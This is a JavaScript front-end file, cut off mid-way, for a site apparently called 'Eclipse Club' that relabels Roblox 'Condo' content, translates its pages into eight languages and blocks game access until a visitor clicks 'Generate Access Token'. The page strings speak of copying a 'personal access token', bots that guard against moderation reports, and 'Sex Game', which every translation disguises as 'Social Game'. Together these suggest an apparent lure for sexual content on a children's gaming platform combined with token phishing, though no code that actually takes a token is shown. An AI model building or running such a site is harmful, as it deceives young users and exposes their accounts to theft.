(function () {
  'use strict';

  var LANG_KEY = 'rc2_lang';
  var currentLang = localStorage.getItem(LANG_KEY) || 'en';

  /* ── Brand name replacement ─────────────────────────────── */
  var BRAND_FIRST = 'Eclipse Club';
  var BRAND_SECOND = '\uD83C\uDF11';
  var BRAND_FULL = 'Eclipse Club \uD83C\uDF11';

  function walkTextNodes(root, fn) {
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null);
    var node;
    while ((node = walker.nextNode())) { fn(node); }
  }

  function doReplace() {
    walkTextNodes(document.body, function (node) {
      var v = node.nodeValue;
      if (!v) return;
      if (v.includes('Roblox Condo')) {
        node.nodeValue = v.replace(/Roblox Condo/g, BRAND_FULL);
      } else if (/^Roblox$/.test(v.trim())) {
        node.nodeValue = v.replace(/Roblox/, BRAND_FIRST);
      } else if (/^Condo$/.test(v.trim())) {
        node.nodeValue = v.replace(/Condo/, BRAND_SECOND);
      }
    });
  }

  /* ── Full translation dictionary ────────────────────────── */
  var TRANSLATIONS = {
    en: {},
    pt: {
      'Access Game': 'Acessar Jogo',
      'Accounts under 80 days old': 'Contas com menos de 80 dias',
      'Action': 'A\u00e7\u00e3o',
      'Combat': 'Combate',
      'Copy token': 'Copiar token',
      'Entry Requirements': 'Requisitos de Entrada',
      'Exclusive': 'Exclusivo',
      'Explore a creative interactive world filled with challenges, surprises, and social gameplay. Connect with players from around the globe.':
        'Explore um mundo interativo criativo cheio de desafios, surpresas e jogabilidade social. Conecte-se com jogadores do mundo todo.',
      'Featured Games': 'Jogos em Destaque',
      'Fun Combat': 'Combate Divertido',
      'Generate Access Token': 'Gerar Token de Acesso',
      'Generate your': 'Gere seu',
      'Jump into intense battles with friends. Fast-paced action with unique mechanics and epic arenas that keep you on the edge of your seat.':
        'Entre em batalhas intensas com amigos. A\u00e7\u00e3o r\u00e1pida com mec\u00e2nicas \u00fanicas e arenas \u00e9picas que te mant\u00eam no limite.',
      'Master the art of blade combat. Duel opponents, unlock legendary weapons, and rise through the ranks to become the ultimate swordsman.':
        'Domine a arte do combate com espadas. Duela oponentes, desbloqueie armas lend\u00e1rias e suba nas classifica\u00e7\u00f5es para se tornar o espadachim supremo.',
      'New Visitor': 'Novo Visitante',
      'Our game uses advanced security bots to protect against reports and ensure a safe experience.':
        'Nosso jogo usa bots de seguran\u00e7a avan\u00e7ados para proteger contra den\u00fancias e garantir uma experi\u00eancia segura.',
      'personal access token': 'token de acesso pessoal',
      'Play Now': 'Jogar Agora',
      'Sex Game': 'Jogo Social',
      'Slap Game': 'Jogo de Tapa',
      'Social': 'Social',
      'Sword Game': 'Jogo de Espada',
      'The ultimate destination for exclusive Roblox games. Pick your game, jump in, and dominate.':
        'O destino definitivo para jogos exclusivos. Escolha seu jogo, entre e domine.',
      'Token Already Generated': 'Token J\u00e1 Gerado',
      'Welcome to the Condo': 'Bem-vindo ao Eclipse Club',
      'Welcome to the ': 'Bem-vindo ao ',
      'Windows PC': 'PC com Windows',
    },
    es: {
      'Access Game': 'Acceder al Juego',
      'Accounts under 80 days old': 'Cuentas menores de 80 d\u00edas',
      'Action': 'Acci\u00f3n',
      'Combat': 'Combate',
      'Copy token': 'Copiar token',
      'Entry Requirements': 'Requisitos de Entrada',
      'Exclusive': 'Exclusivo',
      'Explore a creative interactive world filled with challenges, surprises, and social gameplay. Connect with players from around the globe.':
        'Explora un mundo interactivo lleno de desaf\u00edos, sorpresas y juego social. Con\u00e9ctate con jugadores de todo el mundo.',
      'Featured Games': 'Juegos Destacados',
      'Fun Combat': 'Combate Divertido',
      'Generate Access Token': 'Generar Token de Acceso',
      'Generate your': 'Genera tu',
      'Jump into intense battles with friends. Fast-paced action with unique mechanics and epic arenas that keep you on the edge of your seat.':
        '\u00danete a batallas intensas con amigos. Acci\u00f3n r\u00e1pida con mec\u00e1nicas \u00fanicas y arenas \u00e9picas que te mantienen al l\u00edmite.',
      'Master the art of blade combat. Duel opponents, unlock legendary weapons, and rise through the ranks to become the ultimate swordsman.':
        'Domina el arte del combate con espadas. Duela oponentes, desbloquea armas legendarias y sube en los rankings para convertirte en el espadach\u00edn supremo.',
      'New Visitor': 'Nuevo Visitante',
      'Our game uses advanced security bots to protect against reports and ensure a safe experience.':
        'Nuestro juego usa bots de seguridad avanzados para proteger contra reportes y garantizar una experiencia segura.',
      'personal access token': 'token de acceso personal',
      'Play Now': 'Jugar Ahora',
      'Sex Game': 'Juego Social',
      'Slap Game': 'Juego de Golpes',
      'Social': 'Social',
      'Sword Game': 'Juego de Espadas',
      'The ultimate destination for exclusive Roblox games. Pick your game, jump in, and dominate.':
        'El destino definitivo para juegos exclusivos. Elige tu juego, entra y domina.',
      'Token Already Generated': 'Token Ya Generado',
      'Welcome to the Condo': 'Bienvenido al Eclipse Club',
      'Welcome to the ': 'Bienvenido al ',
      'Windows PC': 'PC con Windows',
    },
    ru: {
      'Access Game': '\u0412\u043e\u0439\u0442\u0438 \u0432 \u0438\u0433\u0440\u0443',
      'Accounts under 80 days old': '\u0410\u043a\u043a\u0430\u0443\u043d\u0442\u044b \u043c\u043b\u0430\u0434\u0448\u0435 80 \u0434\u043d\u0435\u0439',
      'Action': '\u042d\u043a\u0448\u0435\u043d',
      'Combat': '\u0411\u043e\u0439',
      'Copy token': '\u041a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0442\u043e\u043a\u0435\u043d',
      'Entry Requirements': '\u0422\u0440\u0435\u0431\u043e\u0432\u0430\u043d\u0438\u044f \u0432\u0445\u043e\u0434\u0430',
      'Exclusive': '\u042d\u043a\u0441\u043a\u043b\u044e\u0437\u0438\u0432',
      'Explore a creative interactive world filled with challenges, surprises, and social gameplay. Connect with players from around the globe.':
        '\u0418\u0441\u0441\u043b\u0435\u0434\u0443\u0439 \u0442\u0432\u043e\u0440\u0447\u0435\u0441\u043a\u0438\u0439 \u0438\u043d\u0442\u0435\u0440\u0430\u043a\u0442\u0438\u0432\u043d\u044b\u0439 \u043c\u0438\u0440, \u043f\u043e\u043b\u043d\u044b\u0439 \u0438\u0441\u043f\u044b\u0442\u0430\u043d\u0438\u0439 \u0438 \u0441\u043e\u0446\u0438\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u0433\u0435\u0439\u043c\u043f\u043b\u0435\u044f. \u0421\u0432\u044f\u0437\u044b\u0432\u0430\u0439\u0441\u044f \u0441 \u0438\u0433\u0440\u043e\u043a\u0430\u043c\u0438 \u0441\u043e \u0432\u0441\u0435\u0433\u043e \u043c\u0438\u0440\u0430.',
      'Featured Games': '\u0418\u0437\u0431\u0440\u0430\u043d\u043d\u044b\u0435 \u0438\u0433\u0440\u044b',
      'Fun Combat': '\u0412\u0435\u0441\u0451\u043b\u044b\u0439 \u0431\u043e\u0439',
      'Generate Access Token': '\u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0442\u043e\u043a\u0435\u043d \u0434\u043e\u0441\u0442\u0443\u043f\u0430',
      'Generate your': '\u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0441\u0432\u043e\u0439',
      'Jump into intense battles with friends. Fast-paced action with unique mechanics and epic arenas that keep you on the edge of your seat.':
        '\u0412\u0441\u0442\u0443\u043f\u0430\u0439 \u0432 \u0438\u043d\u0442\u0435\u043d\u0441\u0438\u0432\u043d\u044b\u0435 \u0431\u0438\u0442\u0432\u044b \u0441 \u0434\u0440\u0443\u0437\u044c\u044f\u043c\u0438. \u0421\u0442\u0440\u0435\u043c\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0439 \u044d\u043a\u0448\u0435\u043d \u0441 \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u043e\u0439 \u043c\u0435\u0445\u0430\u043d\u0438\u043a\u043e\u0439 \u0438 \u044d\u043f\u0438\u0447\u0435\u0441\u043a\u0438\u043c\u0438 \u0430\u0440\u0435\u043d\u0430\u043c\u0438.',
      'Master the art of blade combat. Duel opponents, unlock legendary weapons, and rise through the ranks to become the ultimate swordsman.':
        '\u041e\u0441\u0432\u043e\u0439 \u0438\u0441\u043a\u0443\u0441\u0441\u0442\u0432\u043e \u0431\u043e\u044f \u043d\u0430 \u043c\u0435\u0447\u0430\u0445. \u0414\u0443\u044d\u043b\u0438 \u0441 \u043e\u043f\u043f\u043e\u043d\u0435\u043d\u0442\u0430\u043c\u0438, \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u0443\u0439 \u043b\u0435\u0433\u0435\u043d\u0434\u0430\u0440\u043d\u043e\u0435 \u043e\u0440\u0443\u0436\u0438\u0435 \u0438 \u0441\u0442\u0430\u043d\u044c \u043b\u0443\u0447\u0448\u0438\u043c \u0444\u0435\u0445\u0442\u043e\u0432\u0430\u043b\u044c\u0449\u0438\u043a\u043e\u043c.',
      'New Visitor': '\u041d\u043e\u0432\u044b\u0439 \u043f\u043e\u0441\u0435\u0442\u0438\u0442\u0435\u043b\u044c',
      'Our game uses advanced security bots to protect against reports and ensure a safe experience.':
        '\u0412 \u043d\u0430\u0448\u0435\u0439 \u0438\u0433\u0440\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u044e\u0442\u0441\u044f \u043f\u0440\u043e\u0434\u0432\u0438\u043d\u0443\u0442\u044b\u0435 \u0431\u043e\u0442\u044b \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438 \u0434\u043b\u044f \u0437\u0430\u0449\u0438\u0442\u044b \u043e\u0442 \u0436\u0430\u043b\u043e\u0431 \u0438 \u043e\u0431\u0435\u0441\u043f\u0435\u0447\u0435\u043d\u0438\u044f \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0433\u043e \u043e\u043f\u044b\u0442\u0430.',
      'personal access token': '\u043b\u0438\u0447\u043d\u044b\u0439 \u0442\u043e\u043a\u0435\u043d \u0434\u043e\u0441\u0442\u0443\u043f\u0430',
      'Play Now': '\u0418\u0433\u0440\u0430\u0442\u044c',
      'Sex Game': '\u0421\u043e\u0446\u0438\u0430\u043b\u044c\u043d\u0430\u044f \u0438\u0433\u0440\u0430',
      'Slap Game': '\u0418\u0433\u0440\u0430 \u0432 \u043f\u043e\u0449\u0451\u0447\u0438\u043d\u044b',
      'Social': '\u0421\u043e\u0446\u0438\u0430\u043b\u044c\u043d\u044b\u0439',
      'Sword Game': '\u0418\u0433\u0440\u0430 \u043d\u0430 \u043c\u0435\u0447\u0430\u0445',
      'The ultimate destination for exclusive Roblox games. Pick your game, jump in, and dominate.':
        '\u041b\u0443\u0447\u0448\u0435\u0435 \u043c\u0435\u0441\u0442\u043e \u0434\u043b\u044f \u044d\u043a\u0441\u043a\u043b\u044e\u0437\u0438\u0432\u043d\u044b\u0445 \u0438\u0433\u0440. \u0412\u044b\u0431\u0435\u0440\u0438 \u0438\u0433\u0440\u0443, \u0437\u0430\u0439\u0434\u0438 \u0438 \u0434\u043e\u043c\u0438\u043d\u0438\u0440\u0443\u0439.',
      'Token Already Generated': '\u0422\u043e\u043a\u0435\u043d \u0443\u0436\u0435 \u0441\u043e\u0437\u0434\u0430\u043d',
      'Welcome to the Condo': '\u0414\u043e\u0431\u0440\u043e \u043f\u043e\u0436\u0430\u043b\u043e\u0432\u0430\u0442\u044c \u0432 Eclipse Club',
      'Welcome to the ': '\u0414\u043e\u0431\u0440\u043e \u043f\u043e\u0436\u0430\u043b\u043e\u0432\u0430\u0442\u044c \u0432 ',
      'Windows PC': 'Windows \u041f\u041a',
    },
    fr: {
      'Access Game': 'Acc\u00e9der au jeu',
      'Accounts under 80 days old': 'Comptes de moins de 80 jours',
      'Action': 'Action',
      'Combat': 'Combat',
      'Copy token': 'Copier le token',
      'Entry Requirements': 'Conditions d\u2019acc\u00e8s',
      'Exclusive': 'Exclusif',
      'Explore a creative interactive world filled with challenges, surprises, and social gameplay. Connect with players from around the globe.':
        'Explorez un monde interactif cr\u00e9atif plein de d\u00e9fis, surprises et jeu social. Connectez-vous avec des joueurs du monde entier.',
      'Featured Games': 'Jeux en vedette',
      'Fun Combat': 'Combat amusant',
      'Generate Access Token': 'G\u00e9n\u00e9rer un token d\u2019acc\u00e8s',
      'Generate your': 'G\u00e9n\u00e9rez votre',
      'Jump into intense battles with friends. Fast-paced action with unique mechanics and epic arenas that keep you on the edge of your seat.':
        'Lancez-vous dans des batailles intenses avec des amis. Action rapide avec des m\u00e9caniques uniques et des ar\u00e8nes \u00e9piques.',
      'Master the art of blade combat. Duel opponents, unlock legendary weapons, and rise through the ranks to become the ultimate swordsman.':
        'Ma\u00eetrisez l\u2019art du combat \u00e0 l\u2019\u00e9p\u00e9e. Duels, armes l\u00e9gendaires et mont\u00e9e dans les classements.',
      'New Visitor': 'Nouveau visiteur',
      'Our game uses advanced security bots to protect against reports and ensure a safe experience.':
        'Notre jeu utilise des bots de s\u00e9curit\u00e9 avanc\u00e9s pour prot\u00e9ger contre les signalements et garantir une exp\u00e9rience s\u00e9curis\u00e9e.',
      'personal access token': 'token d\u2019acc\u00e8s personnel',
      'Play Now': 'Jouer maintenant',
      'Sex Game': 'Jeu Social',
      'Slap Game': 'Jeu de Gifles',
      'Social': 'Social',
      'Sword Game': 'Jeu d\u2019Ep\u00e9e',
      'The ultimate destination for exclusive Roblox games. Pick your game, jump in, and dominate.':
        'La destination ultime pour les jeux exclusifs. Choisissez votre jeu, lancez-vous et dominez.',
      'Token Already Generated': 'Token d\u00e9j\u00e0 g\u00e9n\u00e9r\u00e9',
      'Welcome to the Condo': 'Bienvenue dans Eclipse Club',
      'Welcome to the ': 'Bienvenue dans ',
      'Windows PC': 'PC Windows',
    },
    de: {
      'Access Game': 'Spiel betreten',
      'Accounts under 80 days old': 'Konten j\u00fcnger als 80 Tage',
      'Action': 'Action',
      'Combat': 'Kampf',
      'Copy token': 'Token kopieren',
      'Entry Requirements': 'Anforderungen',
      'Exclusive': 'Exklusiv',
      'Explore a creative interactive world filled with challenges, surprises, and social gameplay. Connect with players from around the globe.':
        'Erkunde eine kreative interaktive Welt voller Herausforderungen, \u00dcberraschungen und sozialem Gameplay. Verbinde dich mit Spielern aus der ganzen Welt.',
      'Featured Games': 'Beliebte Spiele',
      'Fun Combat': 'Spa\u00dfkampf',
      'Generate Access Token': 'Zugangstoken generieren',
      'Generate your': 'Erstelle deinen',
      'Jump into intense battles with friends. Fast-paced action with unique mechanics and epic arenas that keep you on the edge of your seat.':
        'St\u00fcrze dich in intensive K\u00e4mpfe mit Freunden. Rasante Action mit einzigartigen Mechaniken und epischen Arenen.',
      'Master the art of blade combat. Duel opponents, unlock legendary weapons, and rise through the ranks to become the ultimate swordsman.':
        'Meistere die Kunst des Schwertkampfes. Duelle, legend\u00e4re Waffen und der Aufstieg in den Rankings.',
      'New Visitor': 'Neuer Besucher',
      'Our game uses advanced security bots to protect against reports and ensure a safe experience.':
        'Unser Spiel verwendet fortschrittliche Sicherheitsbots zum Schutz vor Meldungen und zur Gew\u00e4hrleistung einer sicheren Erfahrung.',
      'personal access token': 'pers\u00f6nliches Zugriffstoken',
      'Play Now': 'Jetzt spielen',
      'Sex Game': 'Soziales Spiel',
      'Slap Game': 'Klatschspiel',
      'Social': 'Sozial',
      'Sword Game': 'Schwertkampf',
      'The ultimate destination for exclusive Roblox games. Pick your game, jump in, and dominate.':
        'Das ultimative Ziel f\u00fcr exklusive Spiele. W\u00e4hle dein Spiel, steig ein und dominiere.',
      'Token Already Generated': 'Token bereits erstellt',
      'Welcome to the Condo': 'Willkommen im Eclipse Club',
      'Welcome to the ': 'Willkommen im ',
      'Windows PC': 'Windows-PC',
    },
    it: {
      'Access Game': 'Accedi al gioco',
      'Accounts under 80 days old': 'Account con meno di 80 giorni',
      'Action': 'Azione',
      'Combat': 'Combattimento',
      'Copy token': 'Copia token',
      'Entry Requirements': 'Requisiti di accesso',
      'Exclusive': 'Esclusivo',
      'Explore a creative interactive world filled with challenges, surprises, and social gameplay. Connect with players from around the globe.':
        'Esplora un mondo interattivo creativo pieno di sfide, sorprese e gioco sociale. Connettiti con giocatori da tutto il mondo.',
      'Featured Games': 'Giochi in evidenza',
      'Fun Combat': 'Combattimento divertente',
      'Generate Access Token': 'Genera token di accesso',
      'Generate your': 'Genera il tuo',
      'Jump into intense battles with friends. Fast-paced action with unique mechanics and epic arenas that keep you on the edge of your seat.':
        'Tuffati in battaglie intense con gli amici. Azione frenetica con meccaniche uniche e arene epiche.',
      'Master the art of blade combat. Duel opponents, unlock legendary weapons, and rise through the ranks to become the ultimate swordsman.':
        'Padroneggia l\u2019arte del combattimento con la spada. Duelli, armi leggendarie e scalata nelle classifiche.',
      'New Visitor': 'Nuovo visitatore',
      'Our game uses advanced security bots to protect against reports and ensure a safe experience.':
        'Il nostro gioco usa bot di sicurezza avanzati per proteggere dalle segnalazioni e garantire un\u2019esperienza sicura.',
      'personal access token': 'token di accesso personale',
      'Play Now': 'Gioca ora',
      'Sex Game': 'Gioco Sociale',
      'Slap Game': 'Gioco di Schiaffi',
      'Social': 'Sociale',
      'Sword Game': 'Gioco di Spade',
      'The ultimate destination for exclusive Roblox games. Pick your game, jump in, and dominate.':
        'La destinazione definitiva per i giochi esclusivi. Scegli il tuo gioco, entra e domina.',
      'Token Already Generated': 'Token gi\u00e0 generato',
      'Welcome to the Condo': 'Benvenuto in Eclipse Club',
      'Welcome to the ': 'Benvenuto in ',
      'Windows PC': 'PC Windows',
    },
    tr: {
      'Access Game': 'Oyuna Gir',
      'Accounts under 80 days old': '80 g\u00fcnden gen\u00e7 hesaplar',
      'Action': 'Aksiyon',
      'Combat': 'Sava\u015f',
      'Copy token': 'Token\u2019\u0131 kopyala',
      'Entry Requirements': 'Giri\u015f Gereksinimleri',
      'Exclusive': '\u00d6zel',
      'Explore a creative interactive world filled with challenges, surprises, and social gameplay. Connect with players from around the globe.':
        'Zorluklar, s\u00fcrprizler ve sosyal oynanabilirlikle dolu yarat\u0131c\u0131 bir interaktif d\u00fcnya ke\u015ffedin. D\u00fcnya genelindeki oyuncularla ba\u011flant\u0131 kurun.',
      'Featured Games': '\u00d6ne \u00c7\u0131kan Oyunlar',
      'Fun Combat': 'E\u011flenceli Sava\u015f',
      'Generate Access Token': 'Eri\u015fim Token\u2019\u0131 Olu\u015ftur',
      'Generate your': 'Token\u2019\u0131n\u0131z\u0131 olu\u015fturun',
      'Jump into intense battles with friends. Fast-paced action with unique mechanics and epic arenas that keep you on the edge of your seat.':
        'Arkada\u015flar\u0131n\u0131zla yo\u011fun sava\u015flara at\u0131l\u0131n. Benzersiz mekanikler ve epik arenalar ile h\u0131zl\u0131 aksiyon.',
      'Master the art of blade combat. Duel opponents, unlock legendary weapons, and rise through the ranks to become the ultimate swordsman.':
        'K\u0131l\u0131\u00e7 d\u00f6v\u00fc\u015f\u00fc sanat\u0131n\u0131 \u00f6\u011fren. D\u00fcello yap, efsanevi silahlar a\u00e7 ve s\u0131ralamada y\u00fckselerek en iyi k\u0131l\u0131\u00e7\u00e7\u0131 ol.',
      'New Visitor': 'Yeni Ziyaret\u00e7i',
      'Our game uses advanced security bots to protect against reports and ensure a safe experience.':
        'Oyunumuz raporlara kar\u015f\u0131 koruma sa\u011flamak ve g\u00fcvenli bir deneyim sunmak i\u00e7in geli\u015fmi\u015f g\u00fcvenlik botlar\u0131 kullan\u0131r.',
      'personal access token': 'ki\u015fisel eri\u015fim token\u2019\u0131',
      'Play Now': '\u015eimdi Oyna',
      'Sex Game': 'Sosyal Oyun',
      'Slap Game': 'Tokat Oyunu',
      'Social': 'Sosyal',
      'Sword Game': 'K\u0131l\u0131\u00e7 Oyunu',
      'The ultimate destination for exclusive Roblox games. Pick your game, jump in, and dominate.':
        'Exclusive oyunlar i\u00e7in nihai adres. Oyununu se\u00e7, gir ve egemen ol.',
      'Token Already Generated': 'Token Zaten Olu\u015fturuldu',
      'Welcome to the Condo': 'Eclipse Club\u2019a Ho\u015f Geldiniz',
      'Welcome to the ': 'Ho\u015f geldiniz ',
      'Windows PC': 'Windows PC',
    },
  };

  var T = TRANSLATIONS[currentLang] || {};
  var _translated = false;

  function doTranslate() {
    if (!Object.keys(T).length) return;
    walkTextNodes(document.body, function (node) {
      var raw = node.nodeValue;
      if (!raw) return;
      var trimmed = raw.trim();
      if (T[trimmed]) {
        node.nodeValue = raw.replace(trimmed, T[trimmed]);
        _translated = true;
      }
    });
  }

  function doAll() { doReplace(); doTranslate(); }

  var brandObserver = new MutationObserver(function () { doAll(); });
  brandObserver.observe(document.documentElement, { childList: true, subtree: true });
  document.addEventListener('DOMContentLoaded', function () {
    doAll();
    [100, 300, 700, 1500, 3000].forEach(function (ms) { setTimeout(doAll, ms); });
  });
  [100, 300, 700, 1500, 3000].forEach(function (ms) { setTimeout(doAll, ms); });

  /* ── Sound ──────────────────────────────────────────────── */
  var audio = null;
  function playClick() {
    try {
      if (!audio) { audio = new Audio('/click-sound.mp3'); audio.volume = 0.5; }
      audio.currentTime = 0;
      audio.play().catch(function () {});
    } catch (e) {}
  }

  /* ── Token enforcement ──────────────────────────────────── */
  var tokenGeneratedInSession = false;

  var WARN_MSGS = {
    en: 'Generate a token first to access the game.',
    es: 'Genera un token primero para acceder al juego.',
    pt: 'Gere um token primeiro para acessar o jogo.',
    ru: '\u0421\u043d\u0430\u0447\u0430\u043b\u0430 \u0441\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u0442\u043e\u043a\u0435\u043d, \u0447\u0442\u043e\u0431\u044b \u0432\u043e\u0439\u0442\u0438 \u0432 \u0438\u0433\u0440\u0443.',
    fr: 'G\u00e9n\u00e9rez un token d\u2019abord pour acc\u00e9der au jeu.',
    de: 'Erstelle zuerst ein Token, um das Spiel zu betreten.',
    it: 'Genera prima un token per accedere al gioco.',
    tr: 'Oyuna girmek i\u00e7in \u00f6nce bir token olu\u015fturun.',
  };

  function showWarning() {
    var lang = localStorage.getItem(LANG_KEY) || 'en';
    var msg = WARN_MSGS[lang] || WARN_MSGS.en;
    var existing = document.getElementById('rc-token-warning');
    if (existing) return;
    var warn = document.createElement('div');
    warn.id = 'rc-token-warning';
    warn.style.cssText = [
      'position:fixed','bottom:24px','left:50%','transform:translateX(-50%)',
      'background:#021408','border:1px solid rgba(34,197,94,0.5)','color:#86efac',
      'font-size:13px','font-weight:600','padding:10px 20px',
      'border-radius:12px','z-index:999999','white-space:nowrap',
      'box-shadow:0 8px 32px rgba(22,163,74,0.3)',
      'font-family:Outfit,Inter,sans-serif',
    ].join(';');
    warn.textContent = msg;
    document.body.appendChild(warn);
    setTimeout(function () { warn.remove(); }, 2800);
  }

  /* ── Language overlay dismiss ───────────────────────────── */
  function dismissOverlay(lang) {
    localStorage.setItem(LANG_KEY, lang);
    var overlay = document.getElementById('rc-lang-overlay');
    if (overlay) {
      overlay.style.animation = 'rc-fadeout 0.3s ease forwards';
      setTimeout(function () { window.location.reload(); }, 320);
    }
  }

  /* ── Welcome / Language overlay injection ───────────────── */
  function injectLangOverlay() {
    if (localStorage.getItem(LANG_KEY)) return;
    if (document.getElementById('rc-lang-overlay')) return;

    var style = document.createElement('style');
    style.textContent = [
      '@keyframes rc-fadein{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}',
      '@keyframes rc-fadeout{from{opacity:1}to{opacity:0}}',
      '@keyframes rc-glow{0%,100%{box-shadow:0 0 24px rgba(34,197,94,0.3)}50%{box-shadow:0 0 48px rgba(34,197,94,0.6)}}',
      '#rc-lang-overlay{position:fixed;inset:0;z-index:999998;display:flex;align-items:center;justify-content:center;',
        'background:rgba(2,13,4,0.96);backdrop-filter:blur(32px);-webkit-backdrop-filter:blur(32px);}',
      '#rc-lang-card{animation:rc-fadein 0.5s cubic-bezier(0.22,1,0.36,1) forwards;',
        'background:linear-gradient(180deg,rgba(4,20,8,0.98) 0%,rgba(2,12,5,0.98) 100%);',
        'border:1px solid rgba(34,197,94,0.25);border-radius:24px;',
        'box-shadow:0 0 0 1px rgba(34,197,94,0.08),0 40px 80px rgba(0,0,0,0.8),0 0 80px rgba(22,163,74,0.08);',
        'padding:44px 40px 40px;text-align:center;max-width:480px;width:calc(100vw - 40px);',
        'font-family:Outfit,Inter,sans-serif;position:relative;overflow:hidden;}',
      '#rc-lang-card::before{content:"";position:absolute;top:0;left:20%;right:20%;height:1px;',
        'background:linear-gradient(90deg,transparent,rgba(74,222,128,0.6),transparent);}',
      '#rc-lang-moon{font-size:52px;margin-bottom:12px;display:block;',
        'filter:drop-shadow(0 0 20px rgba(34,197,94,0.5));animation:rc-glow 3s ease-in-out infinite;}',
      '#rc-lang-title{font-size:28px;font-weight:900;letter-spacing:-0.03em;margin:0 0 8px;',
        'background:linear-gradient(90deg,#fff 0%,rgba(134,239,172,0.9) 100%);',
        '-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}',
      '#rc-lang-welcome{font-size:12px;color:rgba(134,239,172,0.55);font-weight:500;margin:0 0 28px;',
        'letter-spacing:0.06em;text-transform:uppercase;line-height:1.8;}',
      '#rc-lang-label{font-size:13px;color:rgba(255,255,255,0.4);font-weight:500;margin:0 0 16px;',
        'letter-spacing:0.08em;text-transform:uppercase;}',
      '#rc-lang-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}',
      '.rc-lang-btn{display:flex;align-items:center;gap:10px;padding:12px 16px;',
        'background:rgba(22,163,74,0.07);border:1px solid rgba(34,197,94,0.18);',
        'border-radius:14px;cursor:pointer;transition:all 0.2s ease;',
        'font-family:Outfit,Inter,sans-serif;font-size:14px;font-weight:600;',
        'color:rgba(255,255,255,0.85);text-align:left;width:100%;}',
      '.rc-lang-btn:hover{background:rgba(34,197,94,0.14);border-color:rgba(34,197,94,0.45);',
        'color:#fff;transform:translateY(-2px);box-shadow:0 4px 20px rgba(34,197,94,0.15);}',
      '.rc-lang-btn:active{transform:translateY(0);}',
      '.rc-lang-flag{font-size:22px;line-height:1;}',
      '.rc-lang-name{display:flex;flex-direction:column;gap:1px;}',
      '.rc-lang-native{font-size:14px;font-weight:700;}',
      '.rc-lang-en{font-size:11px;color:rgba(134,239,172,0.55);font-weight:500;}',
    ].join('');
    document.head.appendChild(style);

    var overlay = document.createElement('div');
    overlay.id = 'rc-lang-overlay';

    var langs = [
      { code: 'pt', flag: '\uD83C\uDDE7\uD83C\uDDF7', native: 'Portugu\u00eas', en: 'Portuguese' },
      { code: 'en', flag: '\uD83C\uDDFA\uD83C\uDDF8', native: 'English',    en: 'English' },
      { code: 'es', flag: '\uD83C\uDDEA\uD83C\uDDF8', native: 'Espa\u00f1ol',  en: 'Spanish' },
      { code: 'ru', flag: '\uD83C\uDDF7\uD83C\uDDFA', native: '\u0420\u0443\u0441\u0441\u043a\u0438\u0439',  en: 'Russian' },
      { code: 'fr', flag: '\uD83C\uDDEB\uD83C\uDDF7', native: 'Fran\u00e7ais',  en: 'French' },
      { code: 'de', flag: '\uD83C\uDDE9\uD83C\uDDEA', native: 'Deutsch',    en: 'German' },
      { code: 'it', flag: '\uD83C\uDDEE\uD83C\uDDF9', native: 'Italiano',   en: 'Italian' },
      { code: 'tr', flag: '\uD83C\uDDF9\uD83C\uDDF7', native: 'T\u00fcrk\u00e7e',   en: 'Turkish' },
    ];

    var btnHtml = langs.map(function (l) {
      return [
        '<button class="rc-lang-btn rc-btn" data-lang="', l.code, '">',
          '<span class="rc-lang-flag">', l.flag, '</span>',
          '<span class="rc-lang-name">',
            '<span class="rc-lang-native">', l.native, '</span>',
            '<span class="rc-lang-en">', l.en, '</span>',
          '</span>',
        '</button>',
      ].join('');
    }).join('');

    overlay.innerHTML = [
      '<div id="rc-lang-card">',
        '<span id="rc-lang-moon">\uD83C\uDF11</span>',
        '<h1 id="rc-lang-title">Eclipse Club</h1>',
        '<p id="rc-lang-welcome">',
          'Welcome &nbsp;&bull;&nbsp; Bem-vindo &nbsp;&bull;&nbsp; Bienvenido<br>',
          '\u0414\u043e\u0431\u0440\u043e \u043f\u043e\u0436\u0430\u043b\u043e\u0432\u0430\u0442\u044c &nbsp;&bull;&nbsp; Bienvenue &nbsp;&bull;&nbsp; Willkommen',
        '</p>',
        '<p id="rc-lang-label">Choose your language</p>',
        '<div id="rc-lang-grid">', btnHtml, '</div>',
      '</div>',
    ].join('');

    document.body.appendChild(overlay);

    overlay.querySelectorAll('.rc-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        playClick();
        dismissOverlay(btn.dataset.lang);
      });
    });
  }

  if (document.body) {
    injectLangOverlay();
  } else {
    document.addEventListener('DOMContentLoaded', injectLangOverlay);
  }

  /* ── MutationObserver: sound + token enforcement ────────── */
  var observer = new MutationObserver(function () {
    document.querySelectorAll('button:not([data-rc-s]), a:not([data-rc-s])').forEach(function (el) {
      el.setAttribute('data-rc-s', '1');
      el.addEventListener('click', playClick);
    });

    document.querySelectorAll('[data-testid="button-access-game"]:not([data-rc-e])').forEach(function (el) {
      el.setAttribute('data-rc-e', '1');
      el.addEventListener('click', function (e) {
        if (!tokenGeneratedInSession) {
          e.preventDefault();
          e.stopImmediatePropagation();
          showWarning();
        }
      }, true);
    });

    document.querySelectorAll('[data-testid="button-generate-token"]:not([data-rc-t])').forEach(function (el) {
      el.setAttribute('data-rc-t', '1');
      el.addEventListener('click', function () { tokenGeneratedInSession = true; });
    });
  });

  document.addEventListener('click', function (e) {
    var t = e.target;
    if (!t) return;
    if (
      (t.tagName === 'BUTTON' && t.dataset && t.dataset.testid === 'button-close-modal') ||
      t.id === 'rc-lang-overlay'
    ) {
      tokenGeneratedInSession = false;
    }
  }, true);

  observer.observe(document.body, { childList: true, subtree: true });

  /* ── Support ticket system ──────────────────────────────── */
  var SUPPORT_I18N = {
